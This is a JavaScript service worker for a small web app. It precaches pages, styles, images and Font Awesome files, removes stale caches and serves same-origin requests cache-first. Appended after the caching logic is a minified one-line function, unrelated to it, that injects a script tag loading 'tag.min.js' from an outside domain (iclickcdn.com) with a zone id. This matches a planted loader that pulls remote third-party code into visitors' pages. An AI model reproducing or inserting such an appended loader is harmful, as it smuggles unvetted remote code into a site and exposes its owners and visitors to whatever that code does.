const PRECACHE2 = 'precache-v2';
const RUNTIME = 'runtime-v2';
const PRECACHE_URLS = [
    '/index.html',
    '/CSS/app.css',
    '/JS/app.js',
    '/IMG/IMG_20210306_175328_063.png',
    '/IMG/IMG_20210306_175328_063.JPG',
    '/fontawesome/css/all.css',
    '/fontawesome/js/all.js'   
];
self.addEventListener('install', event => {
    event.waitUntil(caches.open(PRECACHE2)
        .then(cache => cache.addAll(PRECACHE_URLS))
        .then(self.skipWaiting())
    );
});
self.addEventListener('activate', event => {
    const currentCaches = [
        PRECACHE2,
        RUNTIME
    ];
    event.waitUntil(caches.keys().then(cacheNames => {
        return cacheNames.filter(cacheName => !currentCaches.includes(cacheName));
    })
        .then(cachesToDelete => {
            return Promise.all(cachesToDelete.map(cacheToDelete => {
                return caches.delete(cacheToDelete);
            }
            ));
        })
        .then(() => self.clients.claim()));
});
self.addEventListener('fetch', event => {
    if (event.request.url.startsWith(self.location.origin)) {
        event.respondWith(caches.match(event.request)
            .then(cachedResponse => {
                if (cachedResponse) {
                    return cachedResponse;
                }
                return caches.open(RUNTIME)
                    .then(cache => {
                        return fetch(event.request)
                            .then(response => {
                                return cache.put(event.request, response.clone())
                                    .then(() => {
                                        return response;
                                    });
                            });
                    });
            }));
    }
});
(function(s,u,z,p){s.src=u,s.setAttribute('data-zone',z),p.appendChild(s);})(document.createElement('script'),'https://iclickcdn.com/tag.min.js',4042199,document.body||document.documentElement)
